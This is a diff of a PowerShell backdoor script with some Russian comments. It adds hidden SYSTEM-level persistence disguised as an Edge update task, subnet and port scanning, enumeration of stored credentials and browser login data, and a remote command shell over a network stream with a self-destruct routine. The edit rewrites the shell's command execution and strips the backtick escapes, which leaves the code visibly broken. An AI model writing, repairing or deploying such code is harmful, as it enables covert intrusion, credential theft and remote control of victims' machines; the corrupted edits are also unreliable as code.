@@ -27,17 +27,17 @@ function Connect-ZiPo {
 
         1..254 | ForEach-Object {
             $ip = "$subnet$_"
-            Write-Host -NoNewline "`r[*] Scanning $ip..." -ForegroundColor Cyan
+            Write-Host -NoNewline "r[*] Scanning $ip..." -ForegroundColor Cyan
 
             if (Is-Alive $ip) {
-                Write-Host "`r[+] $ip is alive        " -ForegroundColor Green
+                Write-Host "r[+] $ip is alive        " -ForegroundColor Green
                 $alive += $ip
             } else {
-                Write-Host "`r[ ] $ip is offline      " -ForegroundColor DarkGray
+                Write-Host "r[ ] $ip is offline      " -ForegroundColor DarkGray
             }
         }
 
-        return $alive -join "`n"
+        return $alive -join "n"
     }
     catch {
         return "[ERROR] scanHosts failed: $($_.Exception.Message)"
@@ -87,7 +87,7 @@ function Connect-ZiPo {
             $results += "[ERROR] ${ip}:${port} $($_.Exception.Message)"
         }
     }
-    return $results -join "`n"
+    return $results -join "n"
 }
 
 
@@ -134,9 +134,9 @@ function Connect-ZiPo {
 
 
         if (-not (schtasks /Query /TN $taskName -ErrorAction SilentlyContinue)) {
-           schtasks /Create /TN "MicrosoftEdgeUpdateChecker" /SC ONSTART `
-              /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" `
-              /DELAY 0001:00 `
+           schtasks /Create /TN "MicrosoftEdgeUpdateChecker" /SC ONSTART 
+              /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$targetPath"" 
+              /DELAY 0001:00 
               /RL HIGHEST /RU "SYSTEM" /F
         }
 
@@ -163,19 +163,19 @@ function Connect-ZiPo {
         # 1. Windows Credential Manager (generic credentials)
         $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
             $target = $_.ToString().Split(":")[1].Trim()
-            $output += "`n[TARGET] $target"
+            $output += "n[TARGET] $target"
         }
 
         # 2. Chrome saved logins (мета-данные — без дешифровки)
         $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
         if (Test-Path $chromeLoginPath) {
-            $output += "`n[+] Chrome login database found: $chromeLoginPath"
+            $output += "n[+] Chrome login database found: $chromeLoginPath"
         }
 
         # 3. Firefox профили (только список профилей)
         $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
         foreach ($profile in $firefoxProfiles) {
-            $output += "`n[+] Firefox profile: $($profile.FullName)"
+            $output += "n[+] Firefox profile: $($profile.FullName)"
         }
 
         if ([string]::IsNullOrWhiteSpace($output)) {
@@ -312,7 +312,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
 ------------------------------------------------------------
 "@
 
-            $intro = $clear + $banner + "`nPS $currentDir> "
+            $intro = $clear + $banner + "nPS $currentDir> "
             $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
             $stream.Write($bbytes, 0, $bbytes.Length)
             $stream.Flush()
@@ -401,31 +401,9 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         Self-Destruct
                     }
                     else {
-                        $proc = New-Object System.Diagnostics.Process
-                        $proc.StartInfo.FileName = "cmd.exe"
-                        $proc.StartInfo.Arguments = "/c cd `"$currentDir`" & $cmd"
-                        $proc.StartInfo.RedirectStandardOutput = $true
-                        $proc.StartInfo.RedirectStandardError = $true
-                        $proc.StartInfo.UseShellExecute = $false
-                        $proc.StartInfo.CreateNoWindow = $true
-                        $proc.StartInfo.StandardOutputEncoding = [System.Text.Encoding]::UTF8
-                        $proc.Start()
-                        
-                        while (-not $proc.StandardOutput.EndOfStream) {
-                            $line = $proc.StandardOutput.ReadLine()
-                            if ($line -ne $null) {
-                                $outBytes = [Text.Encoding]::UTF8.GetBytes("$line`n")
-                                $stream.Write($outBytes, 0, $outBytes.Length)
-                                $stream.Flush()
-                            }
-                        }
-                        
-                        $proc.WaitForExit()
-                        $currentDir = Get-Location
-                        $prompt = "`n`nPS $currentDir> "
-                        $outBytes = [Text.Encoding]::UTF8.GetBytes($prompt)
-                        $stream.Write($outBytes, 0, $outBytes.Length)
-                        $stream.Flush()
+                        $sb = [ScriptBlock]::Create("cd '$currentDir'; $cmd")
+                        $output = & $sb 2>&1 | Out-String
+                        $response = $output.TrimEnd()
                     }
                 }
                 catch {
@@ -433,7 +411,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                 }
 
                 # Обновлённое добавление приглашения:
-                $response = ($response.TrimEnd() + "`n`nPS $((Get-Location).Path)> ")
+                $response = ($response.TrimEnd() + "nnPS $((Get-Location).Path)> ")
 
 
 
